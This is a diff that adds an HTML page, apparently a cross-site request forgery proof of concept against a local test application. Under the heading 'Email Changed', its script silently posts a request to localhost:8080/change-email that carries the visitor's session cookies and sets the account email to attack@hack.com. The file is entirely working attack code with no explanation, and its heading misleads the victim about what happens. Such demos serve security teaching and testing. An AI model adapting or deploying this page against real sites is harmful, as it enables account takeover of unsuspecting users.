@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h2>Email Changed</h2>
+
+<script>
+  //document.form.submit();
+  fetch('http://localhost:8080/change-email',{
+    method: 'POST',
+    credentials: 'include',
+    mode:'no-cors', //This disable message of cors in the console
+    headers: {
+      'Content-Type': 'application/x-www-form-urlencoded'
+    },
+    body: 'email=attack@hack.com'
+  }).then(res=>res.text())
+    .then(text=>console.log(text))
+    .catch(err=>console.log(err));
+</script>
+</body>
+</html>
